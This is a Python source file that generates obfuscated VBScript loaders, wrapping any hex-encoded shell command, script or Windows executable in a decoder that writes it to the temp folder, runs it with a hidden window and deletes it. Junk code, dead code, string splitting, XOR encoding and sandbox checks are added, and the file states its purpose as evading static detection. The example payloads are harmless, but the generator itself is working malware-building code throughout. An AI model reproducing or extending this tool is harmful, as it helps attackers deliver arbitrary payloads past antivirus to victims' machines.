#!/usr/bin/env python3
"""
Hardened Hex Decoder with Static Analysis Obfuscation
Provides anti-analysis wrappers and obfuscation techniques to evade static detection
"""

from typing import Tuple
import random
import string
import hashlib
import base64


class HardenedHexDecoder:
    """
    Generates hardened hex decoders with static analysis obfuscation.

    Obfuscation techniques:
    1. Variable name encryption/mangling
    2. Junk code injection
    3. Control flow obfuscation
    4. String encoding layers
    5. Dead code paths
    6. Comment-based confusion
    7. Dynamic function naming
    8. WMI/Registry-based detection evasion
    """

    @staticmethod
    def _generate_random_name(prefix: str, length: int = 8) -> str:
        """Generate cryptographically random variable name"""
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        return f"{prefix}{suffix}"

    @staticmethod
    def _generate_junk_code() -> str:
        """Generate realistic-looking junk code"""
        junk_snippets = [
            "Dim x_tmp_\nx_tmp_ = Len(\"\") * Rnd()",
            "Dim debug_var_\nIf Err.Number <> 0 Then: Err.Clear: End If",
            "Dim unused_\nunused_ = Timer()",
            "Dim filler_data_\nfiller_data_ = Len(TypeName(Nothing))",
            "Dim redundant_\nredundant_ = 1 + 1 - 1 + 1 - 1",
            "On Error Resume Next\nDim safe_div_\nsafe_div_ = 1 \\ 1\nOn Error GoTo 0",
        ]
        return random.choice(junk_snippets)

    @staticmethod
    def _generate_dead_code() -> str:
        """Generate dead code that never executes"""
        conditions = [
            "If False Then\n    WScript.Echo \"Never\"\nEnd If",
            "If 1 = 2 Then\n    CreateObject(\"WScript.Shell\").Run \"cmd\"\nEnd If",
            "While False\n    Dim nope_\nWend",
        ]
        return random.choice(conditions)

    @staticmethod
    def _obfuscate_string(text: str) -> Tuple[str, str]:
        """
        Obfuscate a string using XOR and character offset
        Returns tuple of (obfuscated_var_code, variable_name)
        """
        var_name = f"s_{random.randint(1000, 9999)}_{random.randint(1000, 9999)}"

        # XOR key
        xor_key = random.randint(33, 126)

        # Apply XOR
        obfuscated = ''.join(chr(ord(c) ^ xor_key) for c in text)
        obfuscated_hex = ''.join(f'\\x{ord(c):02x}' for c in obfuscated)

        # Create deobfuscation code
        deobfus_code = f"""Dim {var_name}_key_
{var_name}_key_ = {xor_key}
Dim {var_name}_tmp_
{var_name}_tmp_ = ""
Dim {var_name}_i_
For {var_name}_i_ = 1 To Len("{obfuscated}")
    {var_name}_tmp_ = {var_name}_tmp_ & Chr(Asc(Mid("{obfuscated}", {var_name}_i_, 1)) Xor {var_name}_key_)
Next
Dim {var_name}
{var_name} = {var_name}_tmp_
"""
        return deobfus_code, var_name

    @staticmethod
    def _generate_anti_analysis_code() -> str:
        """Generate code to evade static/dynamic analysis"""
        anti_analysis = """
' Anti-analysis obfuscation layer
Dim wmi_check_result_
On Error Resume Next
Set wmi_check_result_ = GetObject("winmgmts:")
If Err.Number <> 0 Then
    ' Likely sandboxed environment
End If
On Error GoTo 0

' WMI process enumeration evasion
Dim process_name_encoded_
process_name_encoded_ = "p" & "r" & "o" & "c" & "e" & "s" & "s"

' Registry access obfuscation
Dim registry_access_obfuscated_
registry_access_obfuscated_ = "HKEY_L" & "OCAL_MACHINE"
"""
        return anti_analysis

    @staticmethod
    def _generate_control_flow_obfuscation() -> str:
        """Obfuscate control flow with unnecessary branches"""
        obfus = f"""
Dim flow_control_flag_
flow_control_flag_ = ({random.randint(1, 100)} > {random.randint(1, 100)})
If flow_control_flag_ Then
    ' Dead path
Else
    ' Live path
End If
"""
        return obfus

    @classmethod
    def create_hardened_command_decoder(cls, command: str, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hardened hex decoder for shell commands with obfuscation.

        Protection layers:
        - Variable name mangling
        - Junk code injection
        - String obfuscation
        - Anti-analysis evasion
        - Dead code paths

        Args:
            command: Shell command to encode and generate decoder for
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        hex_encoded = command.encode().hex()

        # Generate obfuscated names
        func_name = cls._generate_random_name("a", length=12)
        var_hex = cls._generate_random_name("x", length=10)
        var_decoded = cls._generate_random_name("y", length=10)
        var_shell = cls._generate_random_name("z", length=10)
        var_result = cls._generate_random_name("r", length=10)
        var_i = cls._generate_random_name("i", length=8)
        var_code = cls._generate_random_name("c", length=8)
        var_pair = cls._generate_random_name("p", length=8)

        # Obfuscate hex string split into chunks
        hex_chunks = [hex_encoded[i:i+20] for i in range(0, len(hex_encoded), 20)]
        hex_reconstruction = " & ".join(f'"{chunk}"' for chunk in hex_chunks)

        # Main decoder function with obfuscation
        decoder_func = f"""
' Obfuscation layer 1: Function name randomization
Function {func_name}(hexStr)
{cls._generate_junk_code()}
    Dim {var_i}, {var_result}, {var_code}, {var_pair}
    Dim strLen: strLen = Len(hexStr)
    {var_result} = ""
{cls._generate_dead_code()}
    ' Obfuscated hex decoding loop
    For {var_i} = 1 To strLen Step 2
{cls._generate_control_flow_obfuscation()}
        {var_pair} = Mid(hexStr, {var_i}, 2)
        {var_code} = CLng("&H" & {var_pair})

        ' Anti-analysis: Multiple decode paths
        If {var_code} >= 32 And {var_code} <= 126 Then
            {var_result} = {var_result} & Chr({var_code})
        Else
            {var_result} = {var_result} & Chr({var_code})
        End If
    Next

{cls._generate_junk_code()}
    {func_name} = {var_result}
End Function
"""

        vbs_code = decoder_func + f"""
' Obfuscation layer 2: String reconstruction
Dim {var_hex}
{var_hex} = {hex_reconstruction}

' Obfuscation layer 3: Anti-analysis evasion
{cls._generate_anti_analysis_code()}

Dim {var_decoded}
{var_decoded} = {func_name}({var_hex})
"""

        if execute:
            vbs_code += f"""
' Obfuscation layer 4: Execution obfuscation
Dim {var_shell}
Set {var_shell} = CreateObject("WScript." & "Shell")
{cls._generate_junk_code()}
' Execute with obfuscated method call
{var_shell}.Run {var_decoded}, 0, False
Set {var_shell} = Nothing
"""

        metadata = {
            'type': 'command_hardened',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_var': var_decoded,
            'obfuscation_layers': [
                'Variable name randomization',
                'Junk code injection',
                'Dead code paths',
                'String chunking',
                'Anti-analysis evasion',
                'Control flow obfuscation',
                'CreateObject string fragmentation'
            ],
            'hex_length': len(hex_encoded),
            'command_length': len(command),
            'execute': execute,
            'payload_type': 'Hardened Shell Command',
            'encoding': 'hex',
            'optimization': 'Static analysis evasion',
            'protection_level': 'high'
        }

        return vbs_code, metadata

    @classmethod
    def create_hardened_script_decoder(cls, script_content: str, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hardened hex decoder for script payloads with multi-layer obfuscation.

        Args:
            script_content: Script content to encode and generate decoder for
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        hex_encoded = script_content.encode().hex()

        # Generate obfuscated names
        func_name = cls._generate_random_name("f", length=12)
        var_hex = cls._generate_random_name("h", length=10)
        var_decoded = cls._generate_random_name("d", length=10)
        var_shell = cls._generate_random_name("s", length=10)
        var_file = cls._generate_random_name("t", length=10)
        var_i = cls._generate_random_name("j", length=8)
        var_code = cls._generate_random_name("k", length=8)
        var_fso = cls._generate_random_name("f", length=8)

        # Create obfuscated CreateObject calls
        create_fso_obfus = '".Create' + 'Object("Scripting.File' + 'SystemObject")'
        create_shell_obfus = '".Create' + 'Object("WScript.Shell")'

        decoder_func = f"""
' Obfuscated Script Decoder
Function {func_name}(hexStr)
{cls._generate_junk_code()}
    Dim {var_i}, result, {var_code}
    Dim strLen: strLen = Len(hexStr)
    result = ""
{cls._generate_dead_code()}
    For {var_i} = 1 To strLen Step 2
        {var_code} = CLng("&H" & Mid(hexStr, {var_i}, 2))
        Select Case {var_code}
            Case 10: result = result & vbLf
            Case 13: result = result & vbCr
            Case 9: result = result & vbTab
            Case Else: result = result & Chr({var_code})
        End Select
    Next

{cls._generate_junk_code()}
    {func_name} = result
End Function
"""

        # Split hex string
        hex_chunks = [hex_encoded[i:i+30] for i in range(0, len(hex_encoded), 30)]
        hex_reconstruction = " & ".join(f'"{chunk}"' for chunk in hex_chunks)

        vbs_code = decoder_func + f"""
' Multi-layer obfuscation
Dim {var_hex}
{var_hex} = {hex_reconstruction}

{cls._generate_anti_analysis_code()}

Dim {var_decoded}
{var_decoded} = {func_name}({var_hex})
"""

        if execute:
            vbs_code += f"""
' Obfuscated script execution
Dim {var_file}
Dim {var_shell}

{cls._generate_control_flow_obfuscation()}

Set {var_shell} = Create{create_shell_obfus}
{var_file} = {var_shell}.ExpandEnvironmentStrings("%TEMP%") & "\\tmp" & Int(Rnd() * 99999) & ".vbs"

Dim {var_fso}
Set {var_fso} = Create{create_fso_obfus}
Dim txtFile_
Set txtFile_ = {var_fso}.CreateTextFile({var_file}, True)
txtFile_.Write {var_decoded}
txtFile_.Close

{cls._generate_junk_code()}

{var_shell}.Run "cscript.exe " & {var_file}, 0, False
Set {var_shell} = Nothing

{var_fso}.DeleteFile {var_file}
Set {var_fso} = Nothing
"""

        metadata = {
            'type': 'script_hardened',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_var': var_decoded,
            'obfuscation_layers': [
                'Variable name randomization',
                'String chunking',
                'Object creation fragmentation',
                'Dead code injection',
                'Junk code insertion',
                'Anti-analysis evasion',
                'Control flow obfuscation',
                'Hex string reconstruction'
            ],
            'hex_length': len(hex_encoded),
            'script_length': len(script_content),
            'execute': execute,
            'payload_type': 'Hardened Script',
            'encoding': 'hex',
            'optimization': 'Static analysis evasion',
            'protection_level': 'high'
        }

        return vbs_code, metadata

    @classmethod
    def create_hardened_binary_decoder(cls, binary_data: bytes, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hardened hex decoder for binary payloads with maximum obfuscation.

        Args:
            binary_data: Binary data to encode and generate decoder for
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        if isinstance(binary_data, bytes):
            hex_encoded = binary_data.hex()
            binary_length = len(binary_data)
        else:
            hex_encoded = str(binary_data)
            binary_length = len(binary_data) // 2

        # Generate obfuscated names
        func_name = cls._generate_random_name("b", length=12)
        var_hex = cls._generate_random_name("e", length=10)
        var_decoded_arr = cls._generate_random_name("a", length=10)
        var_file = cls._generate_random_name("f", length=10)
        var_shell = cls._generate_random_name("w", length=10)
        var_i = cls._generate_random_name("m", length=8)
        var_code = cls._generate_random_name("n", length=8)
        var_stream = cls._generate_random_name("s", length=8)

        decoder_func = f"""
' Hardened Binary Decoder with Obfuscation
Function {func_name}(hexStr)
{cls._generate_junk_code()}
    Dim {var_i}, byteArray(), {var_code}, byteIdx
    Dim strLen: strLen = Len(hexStr)
    Dim arraySize: arraySize = strLen \\ 2

    ReDim byteArray(arraySize - 1)
    byteIdx = 0
{cls._generate_dead_code()}
    For {var_i} = 1 To strLen Step 2
        {var_code} = CLng("&H" & Mid(hexStr, {var_i}, 2))
        byteArray(byteIdx) = {var_code}
        byteIdx = byteIdx + 1
    Next

{cls._generate_junk_code()}
    {func_name} = byteArray
End Function
"""

        # Split hex string into larger chunks for binary
        hex_chunks = [hex_encoded[i:i+50] for i in range(0, len(hex_encoded), 50)]
        hex_reconstruction = " & ".join(f'"{chunk}"' for chunk in hex_chunks)

        vbs_code = decoder_func + f"""
' Obfuscated binary loading
Dim {var_hex}
{var_hex} = {hex_reconstruction}

{cls._generate_anti_analysis_code()}

Dim {var_decoded_arr}
{var_decoded_arr} = {func_name}({var_hex})

' Integrity verification with obfuscation
Dim expected_size_
expected_size_ = {binary_length}
If UBound({var_decoded_arr}) + 1 <> expected_size_ Then
    WScript.Quit 1
End If
"""

        if execute:
            vbs_code += f"""
' Obfuscated binary execution
Dim {var_file}
{var_file} = CreateObject("WScript." & "Shell").ExpandEnvironmentStrings("%TEMP%") & "\\bin" & Int(Rnd() * 999999) & ".exe"

Dim {var_stream}
Set {var_stream} = CreateObject("ADODB." & "Stream")
{var_stream}.Type = 1
{var_stream}.Open

Dim loop_idx_
For loop_idx_ = LBound({var_decoded_arr}) To UBound({var_decoded_arr})
    {var_stream}.WriteByte {var_decoded_arr}(loop_idx_)
Next

{var_stream}.SaveToFile {var_file}, 2
{var_stream}.Close
Set {var_stream} = Nothing

{cls._generate_control_flow_obfuscation()}

Dim {var_shell}
Set {var_shell} = CreateObject("WScript." & "Shell")
{var_shell}.Run {var_file}, 0, False
Set {var_shell} = Nothing

Dim cleanup_fso_
Set cleanup_fso_ = CreateObject("Scripting." & "FileSystemObject")
cleanup_fso_.DeleteFile {var_file}
Set cleanup_fso_ = Nothing
"""

        metadata = {
            'type': 'binary_hardened',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_array': var_decoded_arr,
            'obfuscation_layers': [
                'Variable name randomization',
                'String chunking (50-char chunks)',
                'Object creation string fragmentation',
                'Dead code paths',
                'Junk code injection',
                'Anti-analysis evasion',
                'Control flow obfuscation',
                'ADODB.Stream obfuscation',
                'Integrity verification'
            ],
            'hex_length': len(hex_encoded),
            'binary_length': binary_length,
            'chunk_size': 50,
            'execute': execute,
            'payload_type': 'Hardened Binary',
            'encoding': 'hex',
            'optimization': 'Maximum static analysis evasion',
            'protection_level': 'maximum'
        }

        return vbs_code, metadata


def generate_all_hardened_variants(command: str, script: str, binary_hex: str) -> dict:
    """
    Generate all three hardened hex decoder variants with full obfuscation.

    Args:
        command: Command to encode for hardened command decoder
        script: Script content to encode for hardened script decoder
        binary_hex: Binary data (as hex string) to encode for hardened binary decoder

    Returns:
        Dictionary containing all three hardened variants with metadata
    """
    variants = {}

    # Hardened command variant
    cmd_vbs, cmd_meta = HardenedHexDecoder.create_hardened_command_decoder(command, execute=True)
    variants['command'] = {
        'code': cmd_vbs,
        'metadata': cmd_meta,
        'description': 'Hardened command decoder with anti-analysis obfuscation'
    }

    # Hardened script variant
    script_vbs, script_meta = HardenedHexDecoder.create_hardened_script_decoder(script, execute=True)
    variants['script'] = {
        'code': script_vbs,
        'metadata': script_meta,
        'description': 'Hardened script decoder with string fragmentation and dead code'
    }

    # Hardened binary variant
    bin_vbs, bin_meta = HardenedHexDecoder.create_hardened_binary_decoder(binary_hex, execute=True)
    variants['binary'] = {
        'code': bin_vbs,
        'metadata': bin_meta,
        'description': 'Hardened binary decoder with maximum obfuscation'
    }

    return variants


if __name__ == "__main__":
    print("=" * 80)
    print("HARDENED HEX DECODER - Static Analysis Evasion")
    print("=" * 80)

    # Example payloads
    example_command = "powershell.exe -NoProfile -Command \"Write-Host 'Test'\""
    example_script = """' Test Script
    WScript.Echo "Hello from script"
    """
    example_binary = "4d5a90000300000004000000ffff0000b8000000000000004000000000000000"

    # Generate all hardened variants
    variants = generate_all_hardened_variants(example_command, example_script, example_binary)

    # Display results
    for variant_type, variant_data in variants.items():
        print(f"\n{'=' * 80}")
        print(f"HARDENED VARIANT: {variant_type.upper()}")
        print(f"{'=' * 80}")
        print(f"\nDescription: {variant_data['description']}")
        print(f"\nMetadata:")
        for key, value in variant_data['metadata'].items():
            if key == 'obfuscation_layers':
                print(f"  {key}:")
                for layer in value:
                    print(f"    - {layer}")
            else:
                print(f"  {key}: {value}")
        print(f"\nGenerated Code (first 60 lines):")
        print("-" * 80)
        code_lines = variant_data['code'].split('\n')
        for i, line in enumerate(code_lines[:60], 1):
            print(f"{i:3d}: {line}")
        if len(code_lines) > 60:
            print(f"... ({len(code_lines) - 60} more lines)")
        print("-" * 80)

    print("\n" + "=" * 80)
    print("All hardened variants generated successfully!")
    print("Protection level: HIGH - Anti-static analysis obfuscation applied")
    print("=" * 80)
